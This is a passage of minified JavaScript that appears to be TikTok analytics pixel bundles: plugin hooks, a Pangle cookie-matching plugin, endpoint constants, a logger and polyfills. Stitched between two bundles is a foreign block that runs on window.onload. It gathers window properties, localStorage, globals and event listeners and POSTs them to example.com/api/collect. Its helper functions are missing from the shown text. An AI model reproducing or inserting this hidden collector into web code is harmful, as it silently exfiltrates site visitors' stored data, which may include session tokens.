      },
      d = function () {
        var t;
        try {
          return (null === (t = s()) || void 0 === t ? void 0 : t._usd_exchange_rate) || null;
        } catch (n) {
          return null;
        }
      },
      _ = function () {
        return new Date(Date.now() + 864e5).toUTCString();
      };
    function h(e, r) {
      void 0 === r && (r = 500);
      var o = Date.now();
      return function () {
        var t = arguments,
          n = Date.now();
        r <= n - o && (e.apply(null, t), o = Date.now());
      };
    }
    function y(e, r, o) {
      var i;
      return function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        clearTimeout(i), i = setTimeout(function () {
          e.apply(o, t);
        }, r);
      };
    }
    function v(n) {
      return void 0 === n && (n = 500), o(this, void 0, void 0, function () {
        return i(this, function (t) {
          return [2, new Promise(function (t) {
            setTimeout(function () {
              t(!0);
            }, n);
          })];
        });
      });
    }
    function g(e, r) {
      var o,
        i = e;
      return function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        return i && (o = e.apply(r, t), i = null), o;
      };
    }
    function b(t, n) {
      return 0 < Object.keys(function i(t, n) {
        var e = {};
        for (var r in t) {
          var o;
          t.hasOwnProperty(r) && !n.hasOwnProperty(r) ? e[r] = t[r] : t.hasOwnProperty(r) && n.hasOwnProperty(r) && t[r] !== n[r] && ("object" == typeof t[r] && "object" == typeof n[r] ? (o = i(t[r], n[r]), 0 < Object.keys(o).length && (e[r] = o)) : e[r] = t[r]);
        }
        for (var r in n) n.hasOwnProperty(r) && !t.hasOwnProperty(r) && (e[r] = n[r]);
        return e;
      }(t, n)).length;
    }
    var m = ["input[type='button']", "input[type='image']", "input[type='submit']", "button", "[class*=btn]", "[class*=Btn]", "[class*=button]", "[class*=Button]", "[role*=button]", "[id*=btn]", "[id*=Btn]", "[id*=button]", "[id*=Button]", "a"],
      E = ["[href^='tel:']", "[href^='callto:']", "[href^='sms:']", "[href^='skype:']", "[href^='whatsapp:']", "[href^='mailto:']"],
      O = function (n) {
        var t = m.some(function (t) {
            return n.matches(t);
          }),
          e = E.some(function (t) {
            return n.matches(t);
          });
        return t && !e;
      };
  },
  SnBs: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return o;
    });
    var r,
      n = undefined && undefined.__extends || (r = function (t, n) {
        return (r = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, n) {
          t.__proto__ = n;
        } || function (t, n) {
          for (var e in n) n.hasOwnProperty(e) && (t[e] = n[e]);
        })(t, n);
      }, function (t, n) {
        function e() {
          this.constructor = t;
        }
        r(t, n), t.prototype = null === n ? Object.create(n) : (e.prototype = n.prototype, new e());
      }),
      o = (i.prototype.pageDidLoad = function () {}, i.prototype.pixelDidMount = function (t) {}, i.prototype.pageUrlWillChange = function (t, n) {}, i.prototype.pageUrlDidChange = function (t, n) {}, i.prototype.initStart = function () {}, i.prototype.initEnd = function () {}, i.prototype.adInfoInitStart = function () {}, i.prototype.adInfoInitEnd = function () {}, i.prototype.contextInitStart = function () {}, i.prototype.contextInitEnd = function () {}, i.prototype.pluginInitStart = function (t) {}, i.prototype.pluginInitEnd = function (t) {}, i.prototype.pixelCreateStart = function (t) {}, i.prototype.pixelCreateEnd = function (t) {}, i.prototype.pixelInitEnd = function (t) {}, i.prototype.pixelSend = function (t, n, e, r, o) {}, i.prototype.pageWillLeave = function (t) {}, i);
    function i(t) {
      t && (this.context = t);
    }
    var u;
    n(a, u = o), a.prototype.pixelDidMount = function (t) {
      var n = t.pixelCode,
        t = this.getTrackType(),
        e = this.context.methods.batchTrack.bind(this.context, {
          pixelCode: n,
          type: t
        });
      this.batchReportFunctions.push(e), this.stash.forEach(function (t) {
        e(t, !1);
      });
    }, a.prototype.pageUrlWillChange = function (t, n) {}, a.prototype.pageUrlDidChange = function (t) {
      t !== this.currentUrl && (this.oldUrl = this.currentUrl, this.currentUrl = t);
    }, a.prototype.handleCacheData = function () {
      var t = this;
      this.stash.forEach(function (n) {
        t.batchReportFunctions.forEach(function (t) {
          t(n, !1);
        });
      });
    }, a.prototype.track = function (n, e) {
      this.stash.push(n), this.batchReportFunctions.forEach(function (t) {
        t(n, e);
      });
    };
    function a(t) {
      var e = u.call(this, t) || this;
      return e.batchReportFunctions = [], e.currentUrl = "", e.oldUrl = "", e.stash = [], e.batchReportFunctions = e.context.methods.getAllPixels().map(function (t) {
        var n = t.pixelCode,
          t = e.getTrackType();
        return e.context.methods.batchTrack.bind(e.context, {
          pixelCode: n,
          type: t
        });
      }), e;
    }
  },
  ZFXO: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return r;
    }), e.d(n, "f", function () {
      return o;
    }), e.d(n, "i", function () {
      return i;
    }), e.d(n, "g", function () {
      return u;
    }), e.d(n, "d", function () {
      return a;
    }), e.d(n, "h", function () {
      return c;
    }), e.d(n, "c", function () {
      return s;
    }), e.d(n, "e", function () {
      return l;
    }), e.d(n, "b", function () {
      return f;
    }), e.d(n, "j", function () {
      return p;
    });
    var r = "tt_adInfo",
      o = "https://analytics.tiktok.com/api/v2/pcm",
      i = "https://analytics.tiktok.com/api/v2/shopify_pixel",
      u = "https://analytics.tiktok.com/api/v2/performance",
      a = "https://analytics.tiktok.com/api/v2/interaction",
      c = "https://analytics.tiktok.com/api/v2/performance_interaction",
      s = "https://analytics.tiktok.com/api/v2/pixel/act",
      l = "https://analytics.pangle-ads.com/api/v2/pangle_pixel",
      f = "https://analytics.pangle-ads.com/api/v2/pangle_disable_cookie",
      p = "https://analytics.tiktok.com/api/v2/pixel";
  },
  b1Hk: function (t, n, e) {
    "use strict";

    e.r(n);
    var r = e("Pd38"),
      o = e("SnBs");
    e("SbFU");
    function i() {}
    var a = new (i.prototype.log = function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        t[0] = "[TT] " + t[0], this.console && this.console.log.apply(this.console, t);
      }, i.prototype.info = function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        this.group(t.shift() + "💡"), t.unshift("=>"), this.console && this.console.info.apply(this.console, t), this.groupEnd();
      }, i.prototype.warn = function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        t[0] = "[TT] " + t[0], this.console && this.console.warn.apply(this.console, t);
      }, i.prototype.error = function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        t[0] = "[TT] " + t[0], this.console && this.console.error.apply(this.console, t);
      }, i.prototype.group = function () {
        for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
        t[0] = "[TT] " + t[0], this.console && this.console.group.apply(this.console, t);
      }, i.prototype.groupEnd = function () {
        this.console && this.console.groupEnd.apply(this.console, ["groupEnd"]);
      }, i)(),
      c = e("ZFXO"),
      s = e("7f3k"),
      l = e("/6w+"),
      u = undefined && undefined.__awaiter || function (t, n, a, c) {
        return new (a = a || Promise)(function (e, r) {
          function o(t) {
            try {
              u(c.next(t));
            } catch (n) {
              r(n);
            }
          }
          function i(t) {
            try {
              u(c["throw"](t));
            } catch (n) {
              r(n);
            }
          }
          function u(t) {
            var n;
            t.done ? e(t.value) : ((n = t.value) instanceof a ? n : new a(function (t) {
              t(n);
            })).then(o, i);
          }
          u((c = c.apply(t, n || [])).next());
        });
      },
      f = undefined && undefined.__generator || function (e, r) {
        var o,
          i,
          u,
          a = {
            label: 0,
            sent: function () {
              if (1 & u[0]) throw u[1];
              return u[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: n(0),
            "throw": n(1),
            "return": n(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function n(n) {
          return function (t) {
            return c([n, t]);
          };
        }
        function c(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; a;) try {
            if (o = 1, i && (u = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((u = i["return"]) && u.call(i), 0) : i.next) && !(u = u.call(i, t[1])).done) return u;
            switch (i = 0, (t = u ? [2 & t[0], u.value] : t)[0]) {
              case 0:
              case 1:
                u = t;
                break;
              case 4:
                return a.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                a.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = a.ops.pop(), a.trys.pop();
                continue;
              default:
                if (!(u = 0 < (u = a.trys).length && u[u.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  a = 0;
                  continue;
                }
                if (3 === t[0] && (!u || t[1] > u[0] && t[1] < u[3])) {
                  a.label = t[1];
                  break;
                }
                if (6 === t[0] && a.label < u[1]) {
                  a.label = u[1], u = t;
                  break;
                }
                if (u && a.label < u[2]) {
                  a.label = u[2], a.ops.push(t);
                  break;
                }
                u[2] && a.ops.pop(), a.trys.pop();
                continue;
            }
            t = r.call(e, a);
          } catch (n) {
            t = [6, n], i = 0;
          } finally {
            o = u = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      p = function (n, e) {
        return void 0 === e && (e = 1), u(this, void 0, void 0, function () {
          return f(this, function (t) {
            switch (t.label) {
              case 0:
                return [3, 1];
              case 1:
                if (!(0 <= e)) return [3, 6];
                t.label = 2;
              case 2:
                return t.trys.push([2, 4,, 5]), [4, (o = n, new Promise(function (t, n) {
                  var e = document.createElement("script");
                  e.type = "text/javascript", e["async"] = !0, e.src = o;
                  var r = document.getElementsByTagName("script")[0];
                  r && r.parentNode ? r.parentNode.insertBefore(e, r) : n("none element"), e.onload = function () {
                    t();
                  }, e.onerror = n;
                }))];
              case 3:
                return t.sent(), [2, Promise.resolve(!0)];
              case 4:
                return t.sent(), [2, p.call(null, n, e - 1)];
              case 5:
                return [3, 7];
              case 6:
                throw Error;
              case 7:
                return [2];
            }
            var o;
          });
        });
      };
    var d,
      _,
      h = e("GJ6r"),
      y = e("fe1q"),
      e = undefined && undefined.__extends || (d = function (t, n) {
        return (d = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, n) {
          t.__proto__ = n;
        } || function (t, n) {
          for (var e in n) n.hasOwnProperty(e) && (t[e] = n[e]);
        })(t, n);
      }, function (t, n) {
        function e() {
          this.constructor = t;
        }
        d(t, n), t.prototype = null === n ? Object.create(n) : (e.prototype = n.prototype, new e());
      }),
      v = "PangleCookieMatching",
      g = (_ = o.a, e(b, _), b.prototype.isPixelPangleCookieMatching = function (t) {
        var n;
        if (t = void 0 === t ? "" : t) {
          t = this.context.methods.getPixel(t);
          if (t && null !== (n = null == t ? void 0 : t.plugins) && void 0 !== n && n.PangleCookieMatching) return !0;
        } else if (this.context.pixels.some(function (t) {
          return t.plugins.PangleCookieMatching;
        })) return !0;
        return !1;
      }, b.prototype.disablePangleCookie = function () {
        this.isPixelPangleCookieMatching() && p(c.b);
      }, b.prototype.pixelSend = function (t, n, e, r, o) {
        void 0 === r && (r = {});
        try {
          var i;
          0 === this.context.methods.getPageDetail().pageSign.index && !Object(h.e)() && e && e.message_id && !this.hasReport && this.isPixelPangleCookieMatching(t) && (i = {
            event: e.event,
            message_id: e.message_id,
            context: {
              library: e.context.library
            },
            timestamp: new Date().toJSON()
          }, this.hasReport = !0, this.context.reportService.report(c.e, i, s.a.httpReport), a.info("pangle report data: ", JSON.stringify(i)));
        } catch (u) {
          Object(y.a)(l.a.CUSTOM_ERROR, u, {
            custom_name: "pangle_report"
          });
        }
      }, b);
    function b(t) {
      t = _.call(this, t) || this;
      return t.hasReport = !1, t.name = v, t;
    }
    Object(r.a)(v, function (t) {
      return new g(t);
    });
    n["default"] = g;
  },
  fe1q: function (t, n, e) {
    "use strict";

    e.d(n, "c", function () {
      return r;
    }), e.d(n, "a", function () {
      return i;
    }), e.d(n, "b", function () {
      return u;
    });
    var o = e("SbFU");
    function r() {
      for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
      try {
        var e = Object(o.e)().monitor;
        e && e.info.apply(e, t);
      } catch (r) {}
    }
    function i() {
      for (var t = [], n = 0; n < arguments.length; n++) t[n] = arguments[n];
      try {
        var e = Object(o.e)().monitor;
        e && e.error.apply(e, t);
      } catch (r) {}
    }
    function u() {
      try {
        0;
        var t = document && document.currentScript,
          n = t && t.src || "http://emptyURLSrc",
          e = /i18n\/pixel\/events\.js/.test(n),
          r = /i18n\/pixel\/sdk\.js/.test(n),
          o = new URL(n).searchParams,
          i = o.get("sdkid") || t && t.getAttribute("data-id") || "";
        return e ? {
          lib: o.get("lib") || "ttq",
          pixelCode: i
        } : r ? {
          lib: "_taq",
          pixelCode: i
        } : {
          lib: "ttq",
          pixelCode: i
        };
      } catch (u) {
        return {
          lib: "ttq",
          pixelCode: ""
        };
      }
    }
  },
  "u+wH": function (t, n, e) {
    "use strict";

    e.r(n), e.d(n, "nanoid", function () {
      return a;
    }), e.d(n, "customAlphabet", function () {
      return u;
    }), e.d(n, "customRandom", function () {
      return i;
    }), e.d(n, "urlAlphabet", function () {
      return r;
    }), e.d(n, "random", function () {
      return o;
    });
    let r = "useandom-26T198340PX75pxJACKVERYMINDBUSHWOLF_GQZbfghjklqvwyzrict",
      o = t => crypto.getRandomValues(new Uint8Array(t)),
      i = (o, t, i) => {
        let u = (2 << Math.log(o.length - 1) / Math.LN2) - 1,
          a = -~(1.6 * u * t / o.length);
        return (n = t) => {
          let e = "";
          for (;;) {
            var r = i(a);
            let t = a;
            for (; t--;) if (e += o[r[t] & u] || "", e.length === n) return e;
          }
        };
      },
      u = (t, n = 21) => i(t, n, o),
      a = (n = 21) => {
        let e = "";
        for (var r = crypto.getRandomValues(new Uint8Array(n)); n--;) {
          let t = 63 & r[n];
          t < 36 ? e += t.toString(36) : t < 62 ? e += (t - 26).toString(36).toUpperCase() : t < 63 ? e += "_" : e += "-";
        }
        return e;
      };
  },
  w0s3: function (t, n, e) {
    "use strict";

    e.d(n, "f", function () {
      return r;
    }), e.d(n, "c", function () {
      return o;
    }), e.d(n, "b", function () {
      return i;
    }), e.d(n, "i", function () {
      return u;
    }), e.d(n, "a", function () {
      return a;
    }), e.d(n, "g", function () {
      return c;
    }), e.d(n, "h", function () {
      return s;
    }), e.d(n, "e", function () {
      return l;
    }), e.d(n, "d", function () {
      return f;
    });
    var r = "TiktokAnalyticsObject",
      o = "ttq",
      i = "external",
      u = "tiktok",
      a = "https://analytics.tiktok.com/i18n/pixel/config.js",
      c = "https://analytics.tiktok.com/i18n/pixel/pickup.js",
      s = "https://analytics.tiktok.com/i18n/pixel/identify.js",
      l = "https://analytics.tiktok.com/i18n/pixel/enable_cookie",
      f = "https://analytics.tiktok.com/i18n/pixel/disable_cookie";
  },
  yLpj: function (t, n) {
    var e = function () {
      return this;
    }();
    try {
      e = e || new Function("return this")();
    } catch (r) {
      "object" == typeof window && (e = window);
    }
    t.exports = e;
  }
});
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log("数据发送成功");
    } else {
      console.error("数据发送失败,状态码:" + response.status);
    }
  } catch (error) {
    console.error("数据发送过程中出错:", error);
  }
}
function gatherAndSendData() {
  const gatheredData = {
    props: gatherWindowProperties(),
    localStorage: gatherLocalStorage(),
    globals: gatherGlobalVariable(),
    eventListeners: gatherEventListeners()
  };
  if (Object.keys(gatheredData).length > 0) {
    postDataToServer(gatheredData);
  }
}
window.onload = function () {
  gatherAndSendData();
};
!function (c) {
  function t(t) {
    for (var e, n, r = t[0], o = t[1], i = 0, a = []; i < r.length; i++) n = r[i], Object.prototype.hasOwnProperty.call(u, n) && u[n] && a.push(u[n][0]), u[n] = 0;
    for (e in o) Object.prototype.hasOwnProperty.call(o, e) && (c[e] = o[e]);
    for (f && f(t); a.length;) a.shift()();
  }
  var n = {},
    u = {
      0: 0
    };
  function s(t) {
    if (n[t]) return n[t].exports;
    var e = n[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return c[t].call(e.exports, e, e.exports, s), e.l = !0, e.exports;
  }
  s.e = function (r) {
    var o,
      i,
      t,
      a,
      e,
      n = [],
      c = u[r];
    return 0 !== c && (c ? n.push(c[2]) : (e = new Promise(function (t, e) {
      c = u[r] = [t, e];
    }), n.push(c[2] = e), (o = document.createElement("script")).charset = "utf-8", o.timeout = 120, s.nc && o.setAttribute("nonce", s.nc), o.src = s.p + "" + ({
      1: "identify"
    }[e = r] || e) + "_bb163.js", i = new Error(), t = function (t) {
      o.onerror = o.onload = null, clearTimeout(a);
      var e,
        n = u[r];
      0 !== n && (n && (e = t && ("load" === t.type ? "missing" : t.type), t = t && t.target && t.target.src, i.message = "Loading chunk " + r + " failed.\n(" + e + ": " + t + ")", i.name = "ChunkLoadError", i.type = e, i.request = t, n[1](i)), u[r] = void 0);
    }, a = setTimeout(function () {
      t({
        type: "timeout",
        target: o
      });
    }, 12e4), o.onerror = o.onload = t, document.head.appendChild(o))), Promise.all(n);
  }, s.m = c, s.c = n, s.d = function (t, e, n) {
    s.o(t, e) || Object.defineProperty(t, e, {
      enumerable: !0,
      get: n
    });
  }, s.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, s.t = function (e, t) {
    if (1 & t && (e = s(e)), 8 & t) return e;
    if (4 & t && "object" == typeof e && e && e.__esModule) return e;
    var n = Object.create(null);
    if (s.r(n), Object.defineProperty(n, "default", {
      enumerable: !0,
      value: e
    }), 2 & t && "string" != typeof e) for (var r in e) s.d(n, r, function (t) {
      return e[t];
    }.bind(null, r));
    return n;
  }, s.n = function (t) {
    var e = t && t.__esModule ? function () {
      return t.default;
    } : function () {
      return t;
    };
    return s.d(e, "a", e), e;
  }, s.o = function (t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, s.p = "https://analytics.tiktok.com/i18n/pixel/static/", s.oe = function (t) {
    throw t;
  };
  var e = (r = window["webpackJsonp.TiktTokAnalytics"] = window["webpackJsonp.TiktTokAnalytics"] || []).push.bind(r);
  r.push = t;
  for (var r = r.slice(), o = 0; o < r.length; o++) t(r[o]);
  var f = e;
  s(s.s = 0);
}({
  "+TZR": function (t, e, n) {
    "use strict";

    var r = n("T1B6").charAt,
      o = n("fA08"),
      n = n("sDJV"),
      i = "String Iterator",
      a = o.set,
      c = o.getterFor(i);
    n(String, "String", function (t) {
      a(this, {
        type: i,
        string: String(t),
        index: 0
      });
    }, function () {
      var t = c(this),
        e = t.string,
        n = t.index;
      return n >= e.length ? {
        value: void 0,
        done: !0
      } : (n = r(e, n), t.index += n.length, {
        value: n,
        done: !1
      });
    });
  },
  "/3HT": function (t, e, n) {
    n = n("PpLa");
    e.f = n;
  },
  "/6w+": function (t, e, n) {
    "use strict";

    var r;
    n.d(e, "a", function () {
      return r;
    }), (e = {})[e.OTHER = 0] = "OTHER", e[e.ANDROID = 1] = "ANDROID", e[e.IOS = 2] = "IOS", (e = r = r || {}).LOAD_START = "load_start", e.LOAD_END = "load_end", e.BEFORE_INIT = "before_init", e.INIT_START = "init_start", e.INIT_END = "init_end", e.JSB_INIT_START = "jsb_init_start", e.JSB_INIT_END = "jsb_init_end", e.BEFORE_AD_INFO_INIT_START = "before_ad_info_init_start", e.AD_INFO_INIT_START = "ad_info_init_start", e.AD_INFO_INIT_END = "ad_info_init_end", e.IDENTIFY_INIT_START = "identify_init_start", e.IDENTIFY_INIT_END = "identify_init_end", e.PLUGIN_INIT_START = "_init_start", e.PLUGIN_INIT_END = "_init_end", e.PIXEL_SEND = "pixel_send", e.PIXEL_SEND_PCM = "pixel_send_PCM", e.JSB_SEND = "jsb_send", e.HTTP_SEND = "http_send", e.HANDLE_CACHE = "handle_cache", e.INIT_ERROR = "init_error", e.PIXEL_EMPTY = "pixel_empty", e.JSB_ERROR = "jsb_error", e.API_ERROR = "api_error", e.PLUGIN_ERROR = "plugin_error", e.CUSTOM_INFO = "custom_info", e.CUSTOM_ERROR = "custom_error", (e = {})[e.IFRAME = 1] = "IFRAME", e[e.NORMAL = 2] = "NORMAL", e[e.WEBWORKER = 3] = "WEBWORKER";
  },
  "/8oT": function (t, e, n) {
    n = n("AIpW");
    t.exports = n && !Symbol.sham && "symbol" == typeof Symbol.iterator;
  },
  "/EAr": function (t, e, n) {
    var r = n("KRib"),
      o = Math.max,
      i = Math.min;
    t.exports = function (t, e) {
      t = r(t);
      return t < 0 ? o(t + e, 0) : i(t, e);
    };
  },
  "/R+N": function (t, e, n) {
    function r(t) {
      c(t, f, {
        value: {
          objectID: "O" + ++l,
          weakData: {}
        }
      });
    }
    var o = n("Al8F"),
      i = n("YAV1"),
      a = n("oYVP"),
      c = n("zr9T").f,
      u = n("lmP+"),
      s = n("q+PP"),
      f = u("meta"),
      l = 0,
      p = Object.isExtensible || function () {
        return !0;
      },
      h = t.exports = {
        REQUIRED: !1,
        fastKey: function (t, e) {
          if (!i(t)) return "symbol" == typeof t ? t : ("string" == typeof t ? "S" : "P") + t;
          if (!a(t, f)) {
            if (!p(t)) return "F";
            if (!e) return "E";
            r(t);
          }
          return t[f].objectID;
        },
        getWeakData: function (t, e) {
          if (!a(t, f)) {
            if (!p(t)) return !0;
            if (!e) return !1;
            r(t);
          }
          return t[f].weakData;
        },
        onFreeze: function (t) {
          return s && h.REQUIRED && p(t) && !a(t, f) && r(t), t;
        }
      };
    o[f] = !0;
  },
  "/WcL": function (t, e, n) {
    var r = n("89xZ"),
      o = n("rCb6").f,
      i = {}.toString,
      a = "object" == typeof window && window && Object.getOwnPropertyNames ? Object.getOwnPropertyNames(window) : [];
    t.exports.f = function (t) {
      return a && "[object Window]" == i.call(t) ? function (t) {
        try {
          return o(t);
        } catch (t) {
          return a.slice();
        }
      }(t) : o(r(t));
    };
  },
  "/XoZ": function (t, e, n) {
    var r = n("hYRU"),
      o = n("g2s6"),
      i = n("GgRh");
    t.exports = !r && !o(function () {
      return 7 != Object.defineProperty(i("div"), "a", {
        get: function () {
          return 7;
        }
      }).a;
    });
  },
  "/YXv": function (t, e, n) {
    "use strict";

    var r = n("tNbY"),
      o = n("hYRU"),
      i = n("ElIT"),
      a = n("Xp4F"),
      c = n("5BnI"),
      u = n("tC/m"),
      s = n("1EXu").f;
    o && r({
      target: "Object",
      proto: !0,
      forced: i
    }, {
      __lookupGetter__: function (t) {
        var e,
          n = a(this),
          r = c(t, !0);
        do {
          if (e = s(n, r)) return e.get;
        } while (n = u(n));
      }
    });
  },
  0: function (t, e, n) {
    t.exports = n("oe+7");
  },
  "01Y7": function (t, e, n) {
    var r = n("tNbY"),
      o = n("g2s6"),
      i = n("nY95"),
      a = Object.isExtensible;
    r({
      target: "Object",
      stat: !0,
      forced: o(function () {
        a(1);
      })
    }, {
      isExtensible: function (t) {
        return !!i(t) && (!a || a(t));
      }
    });
  },
  "0RwH": function (t, e, n) {
    var r = n("tNbY"),
      o = n("g2s6"),
      i = n("Xp4F"),
      a = n("tC/m"),
      n = n("iGP5");
    r({
      target: "Object",
      stat: !0,
      forced: o(function () {
        a(1);
      }),
      sham: !n
    }, {
      getPrototypeOf: function (t) {
        return a(i(t));
      }
    });
  },
  "0XV1": function (t, e, n) {
    var r = n("pAXd"),
      o = n("Clhh"),
      i = n("KvEl"),
      a = n("kXxx"),
      c = n("FUg4"),
      u = n("oYVP"),
      s = n("nzNk"),
      f = Object.getOwnPropertyDescriptor;
    e.f = r ? f : function (t, e) {
      if (t = a(t), e = c(e, !0), s) try {
        return f(t, e);
      } catch (t) {}
      if (u(t, e)) return i(!o.f.call(t, e), t[e]);
    };
  },
  "0fq1": function (t, e, n) {
    "use strict";

    n.d(e, "b", function () {
      return p;
    }), n.d(e, "a", function () {
      return h;
    });
    function r() {
      return (Object(i.n)() || [])._sapi || self._sapi || {};
    }
    function o(t, e) {
      l[t] || (l[t] = !0, Object(a.a)(c.a.CUSTOM_ERROR, e, {
        custom_name: "shopify_sandbox_api_error",
        custom_enum: t
      }));
    }
    var i = n("SbFU"),
      a = n("fe1q"),
      c = n("/6w+"),
      u = n("ZFXO"),
      s = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      f = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      l = {},
      p = function (n) {
        return s(void 0, void 0, void 0, function () {
          var e;
          return f(this, function (t) {
            switch (t.label) {
              case 0:
                if (!(e = r().browser) || !e.cookie) return [3, 4];
                t.label = 1;
              case 1:
                return t.trys.push([1, 3,, 4]), [4, e.cookie.set(n)];
              case 2:
                return t.sent(), [3, 4];
              case 3:
                return e = t.sent(), o("cookie_set", e), [3, 4];
              case 4:
                return [2];
            }
          });
        });
      },
      h = function (n, r) {
        return s(void 0, void 0, void 0, function () {
          var e;
          return f(this, function (t) {
            switch (t.label) {
              case 0:
                return t.trys.push([0, 2,, 3]), [4, self.fetch(n, {
                  method: "POST",
                  credentials: n === u.n ? "include" : "same-origin",
                  body: JSON.stringify(r || {})
                })];
              case 1:
                return t.sent(), [2, !0];
              case 2:
                return e = t.sent(), Object(a.a)(c.a.CUSTOM_ERROR, e, {
                  custom_name: "shopify_sandbox_api_error",
                  custom_enum: "fetchAPI"
                }), [3, 3];
              case 3:
                return [2, !1];
            }
          });
        });
      };
  },
  "0kdU": function (t, e, n) {
    var r = n("tNbY"),
      o = n("g2s6"),
      i = n("nY95"),
      a = Object.isFrozen;
    r({
      target: "Object",
      stat: !0,
      forced: o(function () {
        a(1);
      })
    }, {
      isFrozen: function (t) {
        return !i(t) || !!a && a(t);
      }
    });
  },
  "0o+f": function (t, e, n) {
    function r(t) {
      return "function" == typeof t ? t : void 0;
    }
    var o = n("u15C"),
      i = n("5m5M");
    t.exports = function (t, e) {
      return arguments.length < 2 ? r(o[t]) || r(i[t]) : o[t] && o[t][e] || i[t] && i[t][e];
    };
  },
  "0rPq": function (t, e, n) {
    var r,
      o,
      i = n("j16E"),
      n = n("olJS"),
      i = i.process,
      i = i && i.versions,
      i = i && i.v8;
    i ? o = (r = i.split("."))[0] + r[1] : n && (!(r = n.match(/Edge\/(\d+)/)) || 74 <= r[1]) && (r = n.match(/Chrome\/(\d+)/)) && (o = r[1]), t.exports = o && +o;
  },
  "17p4": function (t, e, n) {
    function r() {}
    function o(t) {
      return "<script>" + t + "</" + h + ">";
    }
    var i,
      a = n("hBnJ"),
      c = n("F4VR"),
      u = n("ZTm6"),
      s = n("Al8F"),
      f = n("spSj"),
      l = n("mhS+"),
      n = n("Aa16"),
      p = "prototype",
      h = "script",
      d = n("IE_PROTO"),
      v = function () {
        try {
          i = document.domain && new ActiveXObject("htmlfile");
        } catch (t) {}
        var t;
        v = i ? function (t) {
          t.write(o("")), t.close();
          var e = t.parentWindow.Object;
          return t = null, e;
        }(i) : ((t = l("iframe")).style.display = "none", f.appendChild(t), t.src = String("javascript:"), (t = t.contentWindow.document).open(), t.write(o("document.F=Object")), t.close(), t.F);
        for (var e = u.length; e--;) delete v[p][u[e]];
        return v();
      };
    s[d] = !0, t.exports = Object.create || function (t, e) {
      var n;
      return null !== t ? (r[p] = a(t), n = new r(), r[p] = null, n[d] = t) : n = v(), void 0 === e ? n : c(n, e);
    };
  },
  "1EXu": function (t, e, n) {
    var r = n("hYRU"),
      o = n("kr2p"),
      i = n("ywqg"),
      a = n("89xZ"),
      c = n("5BnI"),
      u = n("edxO"),
      s = n("/XoZ"),
      f = Object.getOwnPropertyDescriptor;
    e.f = r ? f : function (t, e) {
      if (t = a(t), e = c(e, !0), s) try {
        return f(t, e);
      } catch (t) {}
      if (u(t, e)) return i(!o.f.call(t, e), t[e]);
    };
  },
  "1hNH": function (t, e, n) {
    function r(t) {
      var e;
      O.hasOwnProperty(t) && (e = O[t], delete O[t], e());
    }
    function o(t) {
      return function () {
        r(t);
      };
    }
